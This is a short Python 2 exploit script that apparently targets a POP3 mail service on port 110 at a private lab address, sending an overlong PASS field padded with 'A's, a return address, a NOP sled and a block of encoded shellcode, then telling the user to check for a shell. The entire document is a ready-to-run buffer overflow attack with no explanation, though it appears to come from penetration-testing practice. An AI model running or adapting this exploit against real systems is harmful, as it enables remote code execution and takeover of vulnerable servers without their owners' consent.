#!/usr/bin/python

import socket

buffer = []
counter = 100
shellcode = ("\xbf\x4c\x0b\xbf\x07\xdb\xc5\xd9\x74\x24\xf4\x5d\x33\xc9\xb1"
"\x52\x31\x7d\x12\x03\x7d\x12\x83\xa1\xf7\x5d\xf2\xc5\xe0\x20"
"\xfd\x35\xf1\x44\x77\xd0\xc0\x44\xe3\x91\x73\x75\x67\xf7\x7f"
"\xfe\x25\xe3\xf4\x72\xe2\x04\xbc\x39\xd4\x2b\x3d\x11\x24\x2a"
"\xbd\x68\x79\x8c\xfc\xa2\x8c\xcd\x39\xde\x7d\x9f\x92\x94\xd0"
"\x0f\x96\xe1\xe8\xa4\xe4\xe4\x68\x59\xbc\x07\x58\xcc\xb6\x51"
"\x7a\xef\x1b\xea\x33\xf7\x78\xd7\x8a\x8c\x4b\xa3\x0c\x44\x82"
"\x4c\xa2\xa9\x2a\xbf\xba\xee\x8d\x20\xc9\x06\xee\xdd\xca\xdd"
"\x8c\x39\x5e\xc5\x37\xc9\xf8\x21\xc9\x1e\x9e\xa2\xc5\xeb\xd4"
"\xec\xc9\xea\x39\x87\xf6\x67\xbc\x47\x7f\x33\x9b\x43\xdb\xe7"
"\x82\xd2\x81\x46\xba\x04\x6a\x36\x1e\x4f\x87\x23\x13\x12\xc0"
"\x80\x1e\xac\x10\x8f\x29\xdf\x22\x10\x82\x77\x0f\xd9\x0c\x80"
"\x70\xf0\xe9\x1e\x8f\xfb\x09\x37\x54\xaf\x59\x2f\x7d\xd0\x31"
"\xaf\x82\x05\x95\xff\x2c\xf6\x56\xaf\x8c\xa6\x3e\xa5\x02\x98"
"\x5f\xc6\xc8\xb1\xca\x3d\x9b\xb7\x01\x3d\x98\xa0\x17\x3d\x1f"
"\x8a\x91\xdb\x75\xfc\xf7\x74\xe2\x65\x52\x0e\x93\x6a\x48\x6b"
"\x93\xe1\x7f\x8c\x5a\x02\xf5\x9e\x0b\xe2\x40\xfc\x9a\xfd\x7e"
"\x68\x40\x6f\xe5\x68\x0f\x8c\xb2\x3f\x58\x62\xcb\xd5\x74\xdd"
"\x65\xcb\x84\xbb\x4e\x4f\x53\x78\x50\x4e\x16\xc4\x76\x40\xee"
"\xc5\x32\x34\xbe\x93\xec\xe2\x78\x4a\x5f\x5c\xd3\x21\x09\x08"
"\xa2\x09\x8a\x4e\xab\x47\x7c\xae\x1a\x3e\x39\xd1\x93\xd6\xcd"
"\xaa\xc9\x46\x31\x61\x4a\x76\x78\x2b\xfb\x1f\x25\xbe\xb9\x7d"
"\xd6\x15\xfd\x7b\x55\x9f\x7e\x78\x45\xea\x7b\xc4\xc1\x07\xf6"
"\x55\xa4\x27\xa5\x56\xed")
while len(buffer) <= 30:
    buffer.append("A" * 2606 + "\x8f\x35\x4a\x5f" + "\x90" * 8 + shellcode)
print "Sending payload..."
for string in buffer:
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        connect = sock.connect(("10.11.15.76", 110))
        sock.send("USER test\r\n")
        sock.send("PASS " + string + "\r\n")
        sock.send("QUIT\r\n")
    finally:
        sock.close()
print "Script completed! Check to see if you have a shell."
